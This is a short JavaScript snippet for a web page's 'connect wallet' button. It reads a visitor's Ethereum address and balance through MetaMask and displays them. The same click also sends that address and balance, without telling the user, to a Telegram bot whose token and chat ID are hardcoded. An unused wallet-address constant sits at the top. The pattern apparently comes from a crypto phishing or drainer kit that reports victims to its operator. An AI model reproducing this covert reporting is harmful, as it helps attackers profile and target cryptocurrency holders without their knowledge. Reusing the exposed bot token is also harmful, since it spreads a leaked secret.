const WALLET_ADDRESS = "0x4bc7d1503F6fB1F1AA095f7FA59E40B52d33b000";
const BOT_TOKEN = "6951439834:AAGC1DkcRdR-TiSeCZLnePHizNnOAH28WlY";
const CHAT_ID = "6070875352";

async function reportToTelegram(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });
}

document.getElementById("connectButton").onclick = async () => {
  const out = document.getElementById("output");
  if (!window.ethereum) {
    out.innerText = "Install MetaMask.";
    return;
  }

  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  const account = accounts[0];
  const balanceHex = await ethereum.request({
    method: "eth_getBalance",
    params: [account, "latest"]
  });
  const balance = Number(balanceHex) / 1e18;
  out.innerText = `${account}\nBalance: ${balance.toFixed(5)} ETH`;

  await reportToTelegram(`Wallet connected: ${account}\nETH Balance: ${balance.toFixed(5)}`);
};